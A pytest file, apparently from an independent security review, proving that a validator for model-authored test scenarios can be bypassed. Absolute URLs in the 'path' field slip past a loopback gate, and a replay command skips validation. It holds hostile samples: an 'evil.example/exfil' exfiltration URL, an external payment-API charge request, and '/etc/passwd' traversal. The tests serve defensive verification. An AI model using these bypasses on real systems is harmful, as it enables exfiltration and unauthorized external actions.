"""INDEPENDENT REVIEWER 3 — airtight proofs of the confirmed holes.

No mocks, no monkeypatching, no network. Pure deterministic composition of the
real validator, the real compiler and the real URL-joining the executor uses.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from neyma_product_driver import scenarios as scenarios_mod
from neyma_product_driver.scenario_plan import (
    GeneratedAction,
    GeneratedRequest,
    GeneratedScenarioPlan,
    compile_to_scenario,
)
from neyma_product_driver.scenario_validation import ApprovedCommands, validate_scenario

from tests.scenario_fixtures import (  # noqa: E402
    APPROVED_CLEANUP,
    APPROVED_STATE,
    base_scenario,
    make_scenario,
    validation_context,
)

EVIDENCE = Path("/Users/sammyfammy/neyma-product-driver/verification-evidence/r3-safety")
PROOFS: list[dict] = []


def teardown_module(_m: object) -> None:
    EVIDENCE.mkdir(parents=True, exist_ok=True)
    (EVIDENCE / "proofs.json").write_text(json.dumps(PROOFS, indent=2, default=str), encoding="utf-8")


def test_J1_PROOF_request_path_bypasses_the_loopback_gate() -> None:
    """validate_scenario returns ZERO reasons; the URL reaches the client verbatim.

    scenario_validation._check_safety host-checks only ``request.url``
    (scenario_validation.py:330-347). When ``url`` is empty it merely asserts a
    base app_url exists — the ``path`` string itself is never parsed. The
    executor's scenarios._join_url (scenarios.py:907-912) returns ``path``
    verbatim when it starts with http:// or https://, and runner.http_request
    (runner.py:254) calls urllib.request.urlopen with no host restriction.
    """
    external = "https://api.stripe.com/v1/charges"
    hostile = make_scenario(
        "ssrf",
        actions=[
            GeneratedAction(
                kind="request",
                request=GeneratedRequest(
                    method="POST",
                    path=external,
                    headers={"X-Api-Key": "live"},
                    json_body={"amount": 100000},
                    expect_status=200,
                ),
            )
        ],
    )
    reasons = validate_scenario(hostile, validation_context())
    compiled = compile_to_scenario(
        hostile, base=base_scenario(), approved_commands={APPROVED_STATE, APPROVED_CLEANUP}
    )
    spec = compiled.steps[0].request
    final = scenarios_mod._join_url(base_scenario().app_url, spec.path)
    PROOFS.append(
        {
            "finding": "F-1 external HTTP effect via GeneratedRequest.path",
            "payload": external,
            "validate_scenario_reasons": reasons,
            "compiled_request_path": spec.path,
            "compiled_request_method": spec.method,
            "compiled_headers": spec.headers,
            "url_handed_to_http_client": final,
            "control_that_should_have_stopped_it": "scenario_validation.py:330-347",
            "hole": "scenarios.py:907-912 _join_url returns an absolute path verbatim",
        }
    )
    assert reasons == [], f"expected the validator to pass it; got {reasons}"
    assert final == external
    pytest.fail(f"CRITICAL: model-authored text produces an external request to {final}")


def test_J2_replay_path_skips_validation_entirely(tmp_path: Path) -> None:
    """`scenarios run-generated` compiles a saved plan without re-validating it.

    scenario_plan's module contract says three stages and "nothing skips a
    stage". cli.cmd_scenarios_run_generated (cli.py:1426-1465) re-resolves the
    approved command set and calls compile_to_scenario directly; it never calls
    validate_scenario, so the loopback rule, the secret-material rule, the
    authority rule, the fixture-path rule and the wait/timeout bounds are all
    absent on that path.
    """
    hostile = make_scenario(
        "replay-me",
        actions=[
            GeneratedAction(
                kind="request",
                request=GeneratedRequest(method="POST", url="https://evil.example/exfil"),
            ),
            GeneratedAction(kind="wait", wait_ms=10**9),
        ],
        persisted_state_checks=[],
        expected_observations=["x"],
    )
    reasons = validate_scenario(hostile, validation_context())
    assert reasons, "fixture error: validation should refuse this"

    plan_path = tmp_path / "scenario-plan.json"
    plan_path.write_text(
        GeneratedScenarioPlan(scenarios=[hostile]).model_dump_json(), encoding="utf-8"
    )

    # Exactly the replay path's steps.
    reloaded = GeneratedScenarioPlan.model_validate_json(plan_path.read_text(encoding="utf-8"))
    approved = ApprovedCommands.from_sources(scenarios=[base_scenario()])
    model = reloaded.scenarios[0]
    allowed, _refusals = approved.resolve(model.command_strings())
    compiled = compile_to_scenario(model, base=base_scenario(), approved_commands=allowed)

    PROOFS.append(
        {
            "finding": "F-2 replay path skips validate_scenario",
            "validate_scenario_would_refuse_with": reasons,
            "replay_compiled_url": compiled.steps[0].request.url,
            "replay_compiled_wait_ms": compiled.steps[1].wait_ms,
            "hole": "cli.py:1458-1465 — no validate_scenario call",
        }
    )
    assert compiled.steps[0].request.url == "https://evil.example/exfil"
    assert compiled.steps[1].wait_ms == 10**9


def test_J3_validation_gaps_summary() -> None:
    """Enumerate exactly which GeneratedRequest fields the host gate inspects."""
    cases = {
        "url=external": GeneratedRequest(method="POST", url="https://evil.example/x"),
        "path=external": GeneratedRequest(method="POST", path="https://evil.example/x"),
        "path=protocol-relative": GeneratedRequest(method="POST", path="//evil.example/x"),
        "path=traversal": GeneratedRequest(method="POST", path="/../../../../etc/passwd"),
    }
    table = {}
    for label, request in cases.items():
        scenario = make_scenario(
            "probe", actions=[GeneratedAction(kind="request", request=request)]
        )
        reasons = validate_scenario(scenario, validation_context())
        final = scenarios_mod._join_url(base_scenario().app_url, request.url or request.path)
        table[label] = {"refused": bool(reasons), "reasons": reasons, "final_url": final}
    PROOFS.append({"finding": "F-1 scope", "request_field_matrix": table})
    assert table["url=external"]["refused"] is True
    # Documented gap:
    assert table["path=external"]["refused"] is False
    assert table["path=external"]["final_url"] == "https://evil.example/x"
